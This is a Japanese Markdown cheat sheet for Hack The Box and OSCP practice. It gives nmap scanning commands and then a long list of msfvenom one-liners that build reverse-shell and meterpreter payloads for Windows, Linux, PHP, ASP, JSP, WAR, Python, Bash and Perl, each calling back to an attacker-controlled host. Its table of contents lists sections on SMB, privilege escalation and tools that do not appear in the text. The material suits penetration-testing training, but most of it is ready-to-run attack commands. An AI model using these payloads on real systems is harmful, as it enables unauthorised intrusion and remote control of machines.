## CheetSheet

Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
悪用厳禁でお願いします><

日々更新していきます。

## 目次


- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
- [SMB Scan](#SMB_scan)
  - [smbclient](#smbclient)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - [Windows(meterpreter)](#Windows(meterpreter))
      - [Windows(netcatなど)](#Windows(netcatなど))
      - [Linux](#Linux)
      - [ASP(msfvenom)](#ASP(msfvenom))
      - [Handlers](#Handlers)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
  - [Windows](#windows)
    - [windows-exploit-suggester](#windows-exploit-suggester)
  - [Linux](#linux)
    - [linux-exploit-suggester](#linux-exploit-suggester)
- [その他](#その他)
  - [ツールまとめ](#ツールまとめ)
    - [NetCat](#netcat)
    - [searchsploit](#searchsploit)


# Network_scan

### Nmap

基本コマンド

```
nmap -Pn -A 10.10.10.11

-Pn : ICMPのみでなく80,443番ポートにもTCPパケットを送り、同セグメントではARPも送信しホストの存在を判断
-A : OSの種類とそのバージョンを検知
```

他に

```

nmap -sV -O -F --version-light 10.10.10.3


-sV: Probe open ports to determine service/version info
-O: Enable OS detection
-F: Fast mode - Scan fewer ports than the default scan
--version-light: Limit to most likely probes (intensity 2)


集中して大量にみたいときは、
nmap -A -v 10.10.10.3

-v  冗長性をあげる

```

全 port scan

```

nmap -A -p- -Pn 10.10.10.3

-p-: 全port scan

```




### WebScan

# 侵入

## reverse_shell

### msfvenom_reverse_shell

[CheetSheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)

#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```
#### Windows(netcatなど)
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### PHP(msfvenom)
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
```

#### ASP(msfvenom)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```

#### JSP(msfvenom)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
```

#### WAR(msfvenom)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
```

#### Python(msfvenom)
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
```
#### Bash(msfvenom) 
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
```
#### Perl(msfvenom)
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
```
